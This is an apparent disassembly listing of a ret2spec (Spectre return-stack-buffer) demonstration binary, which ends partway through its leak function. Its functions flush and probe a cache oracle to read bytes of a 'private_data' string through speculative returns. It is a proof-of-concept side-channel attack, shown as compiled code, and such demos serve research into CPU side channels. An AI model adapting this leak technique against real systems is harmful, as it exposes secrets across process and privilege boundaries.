
build/demos/ret2spec_sa:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	endbr64
    1004:	sub    rsp,0x8
    1008:	mov    rax,QWORD PTR [rip+0x3fd9]        # 4fe8 <__gmon_start__@Base>
    100f:	test   rax,rax
    1012:	je     1016 <_init+0x16>
    1014:	call   rax
    1016:	add    rsp,0x8
    101a:	ret

Disassembly of section .plt:

0000000000001020 <_ZNSo3putEc@plt-0x10>:
    1020:	push   QWORD PTR [rip+0x3eda]        # 4f00 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	jmp    QWORD PTR [rip+0x3edc]        # 4f08 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	nop    DWORD PTR [rax+0x0]

0000000000001030 <_ZNSo3putEc@plt>:
    1030:	jmp    QWORD PTR [rip+0x3eda]        # 4f10 <_ZNSo3putEc@GLIBCXX_3.4>
    1036:	push   0x0
    103b:	jmp    1020 <_init+0x20>

0000000000001040 <_ZNSt8__detail15_List_node_base7_M_hookEPS0_@plt>:
    1040:	jmp    QWORD PTR [rip+0x3ed2]        # 4f18 <_ZNSt8__detail15_List_node_base7_M_hookEPS0_@GLIBCXX_3.4.15>
    1046:	push   0x1
    104b:	jmp    1020 <_init+0x20>

0000000000001050 <strlen@plt>:
    1050:	jmp    QWORD PTR [rip+0x3eca]        # 4f20 <strlen@GLIBC_2.2.5>
    1056:	push   0x2
    105b:	jmp    1020 <_init+0x20>

0000000000001060 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@plt>:
    1060:	jmp    QWORD PTR [rip+0x3ec2]        # 4f28 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4>
    1066:	push   0x3
    106b:	jmp    1020 <_init+0x20>

0000000000001070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>:
    1070:	jmp    QWORD PTR [rip+0x3eba]        # 4f30 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@GLIBCXX_3.4.15>
    1076:	push   0x4
    107b:	jmp    1020 <_init+0x20>

0000000000001080 <_ZSt20__throw_length_errorPKc@plt>:
    1080:	jmp    QWORD PTR [rip+0x3eb2]        # 4f38 <_ZSt20__throw_length_errorPKc@GLIBCXX_3.4>
    1086:	push   0x5
    108b:	jmp    1020 <_init+0x20>

0000000000001090 <memset@plt>:
    1090:	jmp    QWORD PTR [rip+0x3eaa]        # 4f40 <memset@GLIBC_2.2.5>
    1096:	push   0x6
    109b:	jmp    1020 <_init+0x20>

00000000000010a0 <_ZNSo5flushEv@plt>:
    10a0:	jmp    QWORD PTR [rip+0x3ea2]        # 4f48 <_ZNSo5flushEv@GLIBCXX_3.4>
    10a6:	push   0x7
    10ab:	jmp    1020 <_init+0x20>

00000000000010b0 <sched_setaffinity@plt>:
    10b0:	jmp    QWORD PTR [rip+0x3e9a]        # 4f50 <sched_setaffinity@GLIBC_2.3.4>
    10b6:	push   0x8
    10bb:	jmp    1020 <_init+0x20>

00000000000010c0 <memcpy@plt>:
    10c0:	jmp    QWORD PTR [rip+0x3e92]        # 4f58 <memcpy@GLIBC_2.14>
    10c6:	push   0x9
    10cb:	jmp    1020 <_init+0x20>

00000000000010d0 <__cxa_atexit@plt>:
    10d0:	jmp    QWORD PTR [rip+0x3e8a]        # 4f60 <__cxa_atexit@GLIBC_2.2.5>
    10d6:	push   0xa
    10db:	jmp    1020 <_init+0x20>

00000000000010e0 <_ZdlPv@plt>:
    10e0:	jmp    QWORD PTR [rip+0x3e82]        # 4f68 <_ZdlPv@GLIBCXX_3.4>
    10e6:	push   0xb
    10eb:	jmp    1020 <_init+0x20>

00000000000010f0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>:
    10f0:	jmp    QWORD PTR [rip+0x3e7a]        # 4f70 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4>
    10f6:	push   0xc
    10fb:	jmp    1020 <_init+0x20>

0000000000001100 <_Znwm@plt>:
    1100:	jmp    QWORD PTR [rip+0x3e72]        # 4f78 <_Znwm@GLIBCXX_3.4>
    1106:	push   0xd
    110b:	jmp    1020 <_init+0x20>

0000000000001110 <__stack_chk_fail@plt>:
    1110:	jmp    QWORD PTR [rip+0x3e6a]        # 4f80 <__stack_chk_fail@GLIBC_2.4>
    1116:	push   0xe
    111b:	jmp    1020 <_init+0x20>

0000000000001120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>:
    1120:	jmp    QWORD PTR [rip+0x3e62]        # 4f88 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@GLIBCXX_3.4.9>
    1126:	push   0xf
    112b:	jmp    1020 <_init+0x20>

0000000000001130 <_ZNKSt5ctypeIcE13_M_widen_initEv@plt>:
    1130:	jmp    QWORD PTR [rip+0x3e5a]        # 4f90 <_ZNKSt5ctypeIcE13_M_widen_initEv@GLIBCXX_3.4.11>
    1136:	push   0x10
    113b:	jmp    1020 <_init+0x20>

0000000000001140 <exit@plt>:
    1140:	jmp    QWORD PTR [rip+0x3e52]        # 4f98 <exit@GLIBC_2.2.5>
    1146:	push   0x11
    114b:	jmp    1020 <_init+0x20>

0000000000001150 <_ZSt16__throw_bad_castv@plt>:
    1150:	jmp    QWORD PTR [rip+0x3e4a]        # 4fa0 <_ZSt16__throw_bad_castv@GLIBCXX_3.4>
    1156:	push   0x12
    115b:	jmp    1020 <_init+0x20>

0000000000001160 <getpid@plt>:
    1160:	jmp    QWORD PTR [rip+0x3e42]        # 4fa8 <getpid@GLIBC_2.2.5>
    1166:	push   0x13
    116b:	jmp    1020 <_init+0x20>

0000000000001170 <_ZNSt8ios_base4InitC1Ev@plt>:
    1170:	jmp    QWORD PTR [rip+0x3e3a]        # 4fb0 <_ZNSt8ios_base4InitC1Ev@GLIBCXX_3.4>
    1176:	push   0x14
    117b:	jmp    1020 <_init+0x20>

0000000000001180 <memmove@plt>:
    1180:	jmp    QWORD PTR [rip+0x3e32]        # 4fb8 <memmove@GLIBC_2.2.5>
    1186:	push   0x15
    118b:	jmp    1020 <_init+0x20>

0000000000001190 <_Unwind_Resume@plt>:
    1190:	jmp    QWORD PTR [rip+0x3e2a]        # 4fc0 <_Unwind_Resume@GCC_3.0>
    1196:	push   0x16
    119b:	jmp    1020 <_init+0x20>

00000000000011a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>:
    11a0:	jmp    QWORD PTR [rip+0x3e22]        # 4fc8 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@GLIBCXX_3.4.15>
    11a6:	push   0x17
    11ab:	jmp    1020 <_init+0x20>

Disassembly of section .plt.got:

00000000000011b0 <__cxa_finalize@plt>:
    11b0:	jmp    QWORD PTR [rip+0x3e1a]        # 4fd0 <__cxa_finalize@GLIBC_2.2.5>
    11b6:	xchg   ax,ax

Disassembly of section .text:

00000000000011c0 <_start>:
    11c0:	endbr64
    11c4:	xor    ebp,ebp
    11c6:	mov    r9,rdx
    11c9:	pop    rsi
    11ca:	mov    rdx,rsp
    11cd:	and    rsp,0xfffffffffffffff0
    11d1:	push   rax
    11d2:	push   rsp
    11d3:	xor    r8d,r8d
    11d6:	xor    ecx,ecx
    11d8:	lea    rdi,[rip+0xe6]        # 12c5 <main>
    11df:	call   QWORD PTR [rip+0x3df3]        # 4fd8 <__libc_start_main@GLIBC_2.34>
    11e5:	hlt
    11e6:	cs nop WORD PTR [rax+rax*1+0x0]

00000000000011f0 <deregister_tm_clones>:
    11f0:	lea    rdi,[rip+0x3e31]        # 5028 <__TMC_END__>
    11f7:	lea    rax,[rip+0x3e2a]        # 5028 <__TMC_END__>
    11fe:	cmp    rax,rdi
    1201:	je     1218 <deregister_tm_clones+0x28>
    1203:	mov    rax,QWORD PTR [rip+0x3dd6]        # 4fe0 <_ITM_deregisterTMCloneTable@Base>
    120a:	test   rax,rax
    120d:	je     1218 <deregister_tm_clones+0x28>
    120f:	jmp    rax
    1211:	nop    DWORD PTR [rax+0x0]
    1218:	ret
    1219:	nop    DWORD PTR [rax+0x0]

0000000000001220 <register_tm_clones>:
    1220:	lea    rdi,[rip+0x3e01]        # 5028 <__TMC_END__>
    1227:	lea    rsi,[rip+0x3dfa]        # 5028 <__TMC_END__>
    122e:	sub    rsi,rdi
    1231:	mov    rax,rsi
    1234:	shr    rsi,0x3f
    1238:	sar    rax,0x3
    123c:	add    rsi,rax
    123f:	sar    rsi,1
    1242:	je     1258 <register_tm_clones+0x38>
    1244:	mov    rax,QWORD PTR [rip+0x3da5]        # 4ff0 <_ITM_registerTMCloneTable@Base>
    124b:	test   rax,rax
    124e:	je     1258 <register_tm_clones+0x38>
    1250:	jmp    rax
    1252:	nop    WORD PTR [rax+rax*1+0x0]
    1258:	ret
    1259:	nop    DWORD PTR [rax+0x0]

0000000000001260 <__do_global_dtors_aux>:
    1260:	endbr64
    1264:	cmp    BYTE PTR [rip+0x4005],0x0        # 5270 <completed.0>
    126b:	jne    1298 <__do_global_dtors_aux+0x38>
    126d:	push   rbp
    126e:	cmp    QWORD PTR [rip+0x3d5a],0x0        # 4fd0 <__cxa_finalize@GLIBC_2.2.5>
    1276:	mov    rbp,rsp
    1279:	je     1287 <__do_global_dtors_aux+0x27>
    127b:	mov    rdi,QWORD PTR [rip+0x3d86]        # 5008 <__dso_handle>
    1282:	call   11b0 <__cxa_finalize@plt>
    1287:	call   11f0 <deregister_tm_clones>
    128c:	mov    BYTE PTR [rip+0x3fdd],0x1        # 5270 <completed.0>
    1293:	pop    rbp
    1294:	ret
    1295:	nop    DWORD PTR [rax]
    1298:	ret
    1299:	nop    DWORD PTR [rax+0x0]

00000000000012a0 <frame_dummy>:
    12a0:	endbr64
    12a4:	jmp    1220 <register_tm_clones>

00000000000012a9 <_ZL11NopFunctionv>:
    12a9:	endbr64
    12ad:	ret

00000000000012ae <_ZL21ReturnsFalseRecursionv>:
    12ae:	endbr64
    12b2:	sub    rsp,0x8
    12b6:	mov    edi,0x40
    12bb:	call   13e3 <_Z12ReturnsFalsei>
    12c0:	add    rsp,0x8
    12c4:	ret

00000000000012c5 <main>:
    12c5:	endbr64
    12c9:	push   rbp
    12ca:	push   rbx
    12cb:	sub    rsp,0x18
    12cf:	mov    rax,QWORD PTR fs:0x28
    12d8:	mov    QWORD PTR [rsp+0x8],rax
    12dd:	xor    eax,eax
    12df:	lea    rax,[rip+0xffffffffffffffc3]        # 12a9 <_ZL11NopFunctionv>
    12e6:	mov    QWORD PTR [rip+0x3fcb],rax        # 52b8 <return_true_base_case>
    12ed:	lea    rax,[rip+0xffffffffffffffba]        # 12ae <_ZL21ReturnsFalseRecursionv>
    12f4:	mov    QWORD PTR [rip+0x3fb5],rax        # 52b0 <return_false_base_case>
    12fb:	lea    rsi,[rip+0x1d02]        # 3004 <_IO_stdin_used+0x4>
    1302:	lea    rbx,[rip+0x3d37]        # 5040 <_ZSt4cout@GLIBCXX_3.4>
    1309:	mov    rdi,rbx
    130c:	call   10f0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    1311:	mov    rdi,rbx
    1314:	call   10a0 <_ZNSo5flushEv@plt>
    1319:	mov    ebx,0x0
    131e:	lea    rbp,[rip+0x3d1b]        # 5040 <_ZSt4cout@GLIBCXX_3.4>
    1325:	jmp    133e <main+0x79>
    1327:	movsx  esi,al
    132a:	mov    rdi,rbp
    132d:	call   1030 <_ZNSo3putEc@plt>
    1332:	mov    rdi,rbp
    1335:	call   10a0 <_ZNSo5flushEv@plt>
    133a:	add    rbx,0x1
    133e:	mov    rdi,QWORD PTR [rip+0x3ccb]        # 5010 <private_data>
    1345:	call   1050 <strlen@plt>
    134a:	cmp    rbx,rax
    134d:	jae    1383 <main+0xbe>
    134f:	mov    QWORD PTR [rip+0x3f52],rbx        # 52a8 <current_offset>
    1356:	call   151a <_Z23Ret2AbortedCallLeakBytev>
    135b:	mov    BYTE PTR [rsp+0x7],al
    135f:	mov    rdx,QWORD PTR [rbp+0x0]
    1363:	mov    rdx,QWORD PTR [rdx-0x18]
    1367:	cmp    QWORD PTR [rbp+rdx*1+0x10],0x0
    136d:	je     1327 <main+0x62>
    136f:	lea    rsi,[rsp+0x7]
    1374:	mov    edx,0x1
    1379:	mov    rdi,rbp
    137c:	call   1120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>
    1381:	jmp    1332 <main+0x6d>
    1383:	lea    rsi,[rip+0x1c8f]        # 3019 <_IO_stdin_used+0x19>
    138a:	lea    rdi,[rip+0x3caf]        # 5040 <_ZSt4cout@GLIBCXX_3.4>
    1391:	call   10f0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    1396:	mov    rax,QWORD PTR [rsp+0x8]
    139b:	sub    rax,QWORD PTR fs:0x28
    13a4:	jne    13b2 <main+0xed>
    13a6:	mov    eax,0x0
    13ab:	add    rsp,0x18
    13af:	pop    rbx
    13b0:	pop    rbp
    13b1:	ret
    13b2:	call   1110 <__stack_chk_fail@plt>

00000000000013b7 <_GLOBAL__sub_I_public_data>:
    13b7:	endbr64
    13bb:	push   rbx
    13bc:	lea    rbx,[rip+0x3eae]        # 5271 <_ZStL8__ioinit>
    13c3:	mov    rdi,rbx
    13c6:	call   1170 <_ZNSt8ios_base4InitC1Ev@plt>
    13cb:	lea    rdx,[rip+0x3c36]        # 5008 <__dso_handle>
    13d2:	mov    rsi,rbx
    13d5:	mov    rdi,QWORD PTR [rip+0x3c1c]        # 4ff8 <_ZNSt8ios_base4InitD1Ev@GLIBCXX_3.4>
    13dc:	call   10d0 <__cxa_atexit@plt>
    13e1:	pop    rbx
    13e2:	ret

00000000000013e3 <_Z12ReturnsFalsei>:
    13e3:	endbr64
    13e7:	sub    rsp,0x8
    13eb:	test   edi,edi
    13ed:	jg     1401 <_Z12ReturnsFalsei+0x1e>
    13ef:	call   QWORD PTR [rip+0x3ec3]        # 52b8 <return_true_base_case>
    13f5:	movzx  eax,BYTE PTR [rip+0x3e9c]        # 5298 <false_value>
    13fc:	add    rsp,0x8
    1400:	ret
    1401:	sub    edi,0x1
    1404:	call   13e3 <_Z12ReturnsFalsei>
    1409:	test   al,al
    140b:	je     13f5 <_Z12ReturnsFalsei+0x12>
    140d:	mov    rdx,QWORD PTR [rip+0x3bfc]        # 5010 <private_data>
    1414:	mov    rax,QWORD PTR [rip+0x3e8d]        # 52a8 <current_offset>
    141b:	movzx  eax,BYTE PTR [rdx+rax*1]
    141f:	shl    rax,0xc
    1423:	add    rax,QWORD PTR [rip+0x3e76]        # 52a0 <oracle_ptr>
    142a:	movzx  eax,BYTE PTR [rax]
    142d:	lea    rsi,[rip+0x1c0c]        # 3040 <_IO_stdin_used+0x40>
    1434:	lea    rdi,[rip+0x3c05]        # 5040 <_ZSt4cout@GLIBCXX_3.4>
    143b:	call   10f0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    1440:	mov    rdi,rax
    1443:	call   1060 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@plt>
    1448:	mov    edi,0x1
    144d:	call   1140 <exit@plt>

0000000000001452 <_Z3bazv>:
    1452:	endbr64
    1456:	mfence
    1459:	lfence
    145c:	ret

000000000000145d <_Z3barv>:
    145d:	endbr64
    1461:	sub    rsp,0x18
    1465:	mov    rax,QWORD PTR fs:0x28
    146e:	mov    QWORD PTR [rsp+0x8],rax
    1473:	xor    eax,eax
    1475:	mov    DWORD PTR [rsp+0x4],0xdeadbeef
    147d:	mov    eax,0x64
    1482:	sub    eax,0x1
    1485:	jne    1482 <_Z3barv+0x25>
    1487:	cmp    DWORD PTR [rip+0x3e32],0x0        # 52c0 <_ZL4cond>
    148e:	je     14b5 <_Z3barv+0x58>
    1490:	clflush BYTE PTR [rsp+0x18]
    1495:	mfence
    1498:	lfence
    149b:	mov    eax,0x0
    14a0:	mov    rdx,QWORD PTR [rsp+0x8]
    14a5:	sub    rdx,QWORD PTR fs:0x28
    14ae:	jne    14c1 <_Z3barv+0x64>
    14b0:	add    rsp,0x18
    14b4:	ret
    14b5:	clflush BYTE PTR [rsp+0x18]
    14ba:	mov    eax,0x1
    14bf:	jmp    14a0 <_Z3barv+0x43>
    14c1:	call   1110 <__stack_chk_fail@plt>

00000000000014c6 <_Z3foov>:
    14c6:	endbr64
    14ca:	sub    rsp,0x8
    14ce:	mov    DWORD PTR [rip+0x3de8],0x1        # 52c0 <_ZL4cond>
    14d8:	clflush BYTE PTR [rip+0x3de1]        # 52c0 <_ZL4cond>
    14df:	mfence
    14e2:	lfence
    14e5:	call   145d <_Z3barv>
    14ea:	test   al,al
    14ec:	jne    14f3 <_Z3foov+0x2d>
    14ee:	add    rsp,0x8
    14f2:	ret
    14f3:	call   1452 <_Z3bazv>
    14f8:	mov    rdx,QWORD PTR [rip+0x3b11]        # 5010 <private_data>
    14ff:	mov    rax,QWORD PTR [rip+0x3da2]        # 52a8 <current_offset>
    1506:	movzx  eax,BYTE PTR [rdx+rax*1]
    150a:	shl    rax,0xc
    150e:	add    rax,QWORD PTR [rip+0x3d8b]        # 52a0 <oracle_ptr>
    1515:	movzx  eax,BYTE PTR [rax]
    1518:	jmp    14ee <_Z3foov+0x28>

000000000000151a <_Z23Ret2AbortedCallLeakBytev>:
    151a:	endbr64
    151e:	push   r12
    1520:	push   rbp
    1521:	push   rbx
    1522:	sub    rsp,0x430
    1529:	mov    rax,QWORD PTR fs:0x28
    1532:	mov    QWORD PTR [rsp+0x428],rax
    153a:	xor    eax,eax
    153c:	mov    edi,0x102000
    1541:	call   1100 <_Znwm@plt>
    1546:	mov    rbx,rax
    1549:	mov    ebp,0x0
    154e:	mov    QWORD PTR [rax],0x0
    1555:	lea    r8,[rax+0x1000]
    155c:	mov    QWORD PTR [rax+0xff8],0x0
    1567:	lea    rdi,[rax+0x8]
    156b:	and    rdi,0xfffffffffffffff8
    156f:	mov    rcx,rax
    1572:	sub    rcx,rdi
    1575:	add    ecx,0x1000
    157b:	shr    ecx,0x3
    157e:	mov    ecx,ecx
    1580:	mov    rax,rbp
    1583:	rep stos QWORD PTR es:[rdi],rax
    1586:	mov    edx,0x100000
    158b:	mov    esi,0x0
    1590:	mov    rdi,r8
    1593:	call   1090 <memset@plt>
    1598:	lea    rax,[rbx+0x101000]
    159f:	mov    QWORD PTR [rbx+0x101000],0x0
    15aa:	mov    QWORD PTR [rbx+0x101ff8],0x0
    15b5:	lea    rdi,[rbx+0x101008]
    15bc:	and    rdi,0xfffffffffffffff8
    15c0:	sub    rax,rdi
    15c3:	lea    ecx,[rax+0x1000]
    15c9:	mov    eax,ecx
    15cb:	shr    eax,0x3
    15ce:	mov    ecx,eax
    15d0:	mov    rax,rbp
    15d3:	rep stos QWORD PTR es:[rdi],rax
    15d6:	mov    QWORD PTR [rsp+0x10],rbx
    15db:	lea    rdi,[rsp+0x18]
    15e0:	mov    ecx,0x80
    15e5:	rep stos QWORD PTR es:[rdi],rax
    15e8:	mov    DWORD PTR [rdi],0x0
    15ee:	lea    rdi,[rsp+0x10]
    15f3:	call   1c30 <_ZNK16CacheSideChannel9GetOracleEv>
    15f8:	mov    QWORD PTR [rip+0x3ca1],rax        # 52a0 <oracle_ptr>
    15ff:	mov    ebx,0x186a2
    1604:	lea    rbp,[rsp+0x10]
    1609:	jmp    1627 <_Z23Ret2AbortedCallLeakBytev+0x10d>
    160b:	call   14c6 <_Z3foov>
    1610:	mov    rdi,rbp
    1613:	call   1ec8 <_ZN16CacheSideChannel24AddHitAndRecomputeScoresEv>
    1618:	movsx  edx,ah
    161b:	mov    r12d,edx
    161e:	test   al,al
    1620:	jne    164a <_Z23Ret2AbortedCallLeakBytev+0x130>
    1622:	sub    ebx,0x1
    1625:	je     167f <_Z23Ret2AbortedCallLeakBytev+0x165>
    1627:	mov    DWORD PTR [rip+0x3c8f],0x0        # 52c0 <_ZL4cond>
    1631:	call   145d <_Z3barv>
    1636:	call   145d <_Z3barv>
    163b:	call   145d <_Z3barv>
    1640:	mov    rdi,rbp
    1643:	call   1c3e <_ZNK16CacheSideChannel11FlushOracleEv>
    1648:	jmp    160b <_Z23Ret2AbortedCallLeakBytev+0xf1>
    164a:	mov    rdi,QWORD PTR [rsp+0x10]
    164f:	test   rdi,rdi
    1652:	je     1659 <_Z23Ret2AbortedCallLeakBytev+0x13f>
    1654:	call   10e0 <_ZdlPv@plt>
    1659:	mov    rax,QWORD PTR [rsp+0x428]
    1661:	sub    rax,QWORD PTR fs:0x28
    166a:	jne    1764 <_Z23Ret2AbortedCallLeakBytev+0x24a>
    1670:	mov    eax,r12d
    1673:	add    rsp,0x430
    167a:	pop    rbx
    167b:	pop    rbp
    167c:	pop    r12
    167e:	ret
    167f:	mov    edx,0x12
    1684:	lea    rsi,[rip+0x19d5]        # 3060 <_IO_stdin_used+0x60>
    168b:	lea    rdi,[rip+0x3ace]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    1692:	call   1120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>
    1697:	mov    BYTE PTR [rsp+0xf],r12b
    169c:	mov    rax,QWORD PTR [rip+0x3abd]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    16a3:	mov    rax,QWORD PTR [rax-0x18]
    16a7:	lea    rdx,[rip+0x3ab2]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    16ae:	cmp    QWORD PTR [rdx+rax*1+0x10],0x0
    16b4:	je     16fb <_Z23Ret2AbortedCallLeakBytev+0x1e1>
    16b6:	lea    rsi,[rsp+0xf]
    16bb:	mov    edx,0x1
    16c0:	lea    rdi,[rip+0x3a99]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    16c7:	call   1120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>
    16cc:	mov    rbx,rax
    16cf:	mov    rax,QWORD PTR [rbx]
    16d2:	mov    rax,QWORD PTR [rax-0x18]
    16d6:	mov    rbp,QWORD PTR [rbx+rax*1+0xf0]
    16de:	test   rbp,rbp
    16e1:	je     1714 <_Z23Ret2AbortedCallLeakBytev+0x1fa>
    16e3:	cmp    BYTE PTR [rbp+0x38],0x0
    16e7:	je     1737 <_Z23Ret2AbortedCallLeakBytev+0x21d>
    16e9:	movzx  esi,BYTE PTR [rbp+0x43]
    16ed:	movsx  esi,sil
    16f1:	mov    rdi,rbx
    16f4:	call   1030 <_ZNSo3putEc@plt>
    16f9:	jmp    1752 <_Z23Ret2AbortedCallLeakBytev+0x238>
    16fb:	movsx  esi,r12b
    16ff:	lea    rdi,[rip+0x3a5a]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    1706:	call   1030 <_ZNSo3putEc@plt>
    170b:	lea    rbx,[rip+0x3a4e]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    1712:	jmp    16cf <_Z23Ret2AbortedCallLeakBytev+0x1b5>
    1714:	call   1150 <_ZSt16__throw_bad_castv@plt>
    1719:	endbr64
    171d:	mov    rbx,rax
    1720:	mov    rdi,QWORD PTR [rsp+0x10]
    1725:	test   rdi,rdi
    1728:	je     172f <_Z23Ret2AbortedCallLeakBytev+0x215>
    172a:	call   10e0 <_ZdlPv@plt>
    172f:	mov    rdi,rbx
    1732:	call   1190 <_Unwind_Resume@plt>
    1737:	mov    rdi,rbp
    173a:	call   1130 <_ZNKSt5ctypeIcE13_M_widen_initEv@plt>
    173f:	mov    rax,QWORD PTR [rbp+0x0]
    1743:	mov    esi,0xa
    1748:	mov    rdi,rbp
    174b:	call   QWORD PTR [rax+0x30]
    174e:	mov    esi,eax
    1750:	jmp    16ed <_Z23Ret2AbortedCallLeakBytev+0x1d3>
    1752:	mov    rdi,rax
    1755:	call   10a0 <_ZNSo5flushEv@plt>
    175a:	mov    edi,0x1
    175f:	call   1140 <exit@plt>
    1764:	call   1110 <__stack_chk_fail@plt>

0000000000001769 <_ZL11ReturnsTruei>:
    1769:	push   rbx
    176a:	sub    rsp,0x20
    176e:	mov    ebx,edi
    1770:	mov    rax,QWORD PTR fs:0x28
    1779:	mov    QWORD PTR [rsp+0x18],rax
    177e:	xor    eax,eax
    1780:	mov    BYTE PTR [rsp+0xf],0x61
    1785:	lea    rax,[rsp+0xf]
    178a:	mov    QWORD PTR [rsp+0x10],rax
    178f:	lea    rsi,[rsp+0x10]
    1794:	lea    rdi,[rip+0x3ae5]        # 5280 <stack_mark_pointers>
    179b:	call   1c02 <_ZNSt6vectorIPcSaIS0_EE12emplace_backIJS0_EEEvDpOT_>
    17a0:	test   ebx,ebx
    17a2:	jg     17e5 <_ZL11ReturnsTruei+0x7c>
    17a4:	call   QWORD PTR [rip+0x3b06]        # 52b0 <return_false_base_case>
    17aa:	mov    rax,QWORD PTR [rip+0x3ad7]        # 5288 <stack_mark_pointers+0x8>
    17b1:	lea    rdx,[rax-0x8]
    17b5:	mov    QWORD PTR [rip+0x3acc],rdx        # 5288 <stack_mark_pointers+0x8>
    17bc:	mov    rsi,QWORD PTR [rax-0x10]
    17c0:	lea    rdi,[rsp+0xf]
    17c5:	call   2132 <_Z18FlushFromDataCachePKvS0_>
    17ca:	mov    rax,QWORD PTR [rsp+0x18]
    17cf:	sub    rax,QWORD PTR fs:0x28
    17d8:	jne    17ef <_ZL11ReturnsTruei+0x86>
    17da:	mov    eax,0x1
    17df:	add    rsp,0x20
    17e3:	pop    rbx
    17e4:	ret
    17e5:	lea    edi,[rbx-0x1]
    17e8:	call   1769 <_ZL11ReturnsTruei>
    17ed:	jmp    17aa <_ZL11ReturnsTruei+0x41>
    17ef:	call   1110 <__stack_chk_fail@plt>

00000000000017f4 <_Z16Ret2specLeakBytev>:
    17f4:	endbr64
    17f8:	push   r12
    17fa:	push   rbp
    17fb:	push   rbx
    17fc:	sub    rsp,0x430
    1803:	mov    rax,QWORD PTR fs:0x28
    180c:	mov    QWORD PTR [rsp+0x428],rax
    1814:	xor    eax,eax
    1816:	mov    edi,0x102000
    181b:	call   1100 <_Znwm@plt>
    1820:	mov    rbx,rax
    1823:	mov    ebp,0x0
    1828:	mov    QWORD PTR [rax],0x0
    182f:	lea    r8,[rax+0x1000]
    1836:	mov    QWORD PTR [rax+0xff8],0x0
    1841:	lea    rdi,[rax+0x8]
    1845:	and    rdi,0xfffffffffffffff8
    1849:	mov    rcx,rax
    184c:	sub    rcx,rdi
    184f:	add    ecx,0x1000
    1855:	shr    ecx,0x3
    1858:	mov    ecx,ecx
    185a:	mov    rax,rbp
    185d:	rep stos QWORD PTR es:[rdi],rax
    1860:	mov    edx,0x100000
    1865:	mov    esi,0x0
    186a:	mov    rdi,r8
    186d:	call   1090 <memset@plt>
    1872:	lea    rcx,[rbx+0x101000]
    1879:	mov    QWORD PTR [rbx+0x101000],0x0
    1884:	mov    QWORD PTR [rbx+0x101ff8],0x0
    188f:	lea    rdi,[rbx+0x101008]
    1896:	and    rdi,0xfffffffffffffff8
    189a:	sub    rcx,rdi
    189d:	add    ecx,0x1000
    18a3:	shr    ecx,0x3
    18a6:	mov    ecx,ecx
    18a8:	mov    rax,rbp
    18ab:	rep stos QWORD PTR es:[rdi],rax
    18ae:	mov    QWORD PTR [rsp+0x10],rbx
    18b3:	lea    rdi,[rsp+0x18]
    18b8:	mov    ecx,0x80
    18bd:	rep stos QWORD PTR es:[rdi],rax
    18c0:	mov    DWORD PTR [rdi],0x0
    18c6:	lea    rdi,[rsp+0x10]
    18cb:	call   1c30 <_ZNK16CacheSideChannel9GetOracleEv>
    18d0:	mov    QWORD PTR [rip+0x39c9],rax        # 52a0 <oracle_ptr>
    18d7:	mov    ebp,0x186a2
    18dc:	lea    rbx,[rip+0x399d]        # 5280 <stack_mark_pointers>
    18e3:	jmp    1929 <_Z16Ret2specLeakBytev+0x135>
    18e5:	mov    BYTE PTR [rsp+0x7],0x61
    18ea:	lea    rax,[rsp+0x7]
    18ef:	mov    QWORD PTR [rsp+0x8],rax
    18f4:	lea    rsi,[rsp+0x8]
    18f9:	mov    rdi,rbx
    18fc:	call   1c02 <_ZNSt6vectorIPcSaIS0_EE12emplace_backIJS0_EEEvDpOT_>
    1901:	mov    edi,0x40
    1906:	call   1769 <_ZL11ReturnsTruei>
    190b:	sub    QWORD PTR [rbx+0x8],0x8
    1910:	lea    rdi,[rsp+0x10]
    1915:	call   1ec8 <_ZN16CacheSideChannel24AddHitAndRecomputeScoresEv>
    191a:	movsx  edx,ah
    191d:	mov    r12d,edx
    1920:	test   al,al
    1922:	jne    1935 <_Z16Ret2specLeakBytev+0x141>
    1924:	sub    ebp,0x1
    1927:	je     196a <_Z16Ret2specLeakBytev+0x176>
    1929:	lea    rdi,[rsp+0x10]
    192e:	call   1c3e <_ZNK16CacheSideChannel11FlushOracleEv>
    1933:	jmp    18e5 <_Z16Ret2specLeakBytev+0xf1>
    1935:	mov    rdi,QWORD PTR [rsp+0x10]
    193a:	test   rdi,rdi
    193d:	je     1944 <_Z16Ret2specLeakBytev+0x150>
    193f:	call   10e0 <_ZdlPv@plt>
    1944:	mov    rax,QWORD PTR [rsp+0x428]
    194c:	sub    rax,QWORD PTR fs:0x28
    1955:	jne    1a4c <_Z16Ret2specLeakBytev+0x258>
    195b:	mov    eax,r12d
    195e:	add    rsp,0x430
    1965:	pop    rbx
    1966:	pop    rbp
    1967:	pop    r12
    1969:	ret
    196a:	mov    edx,0x12
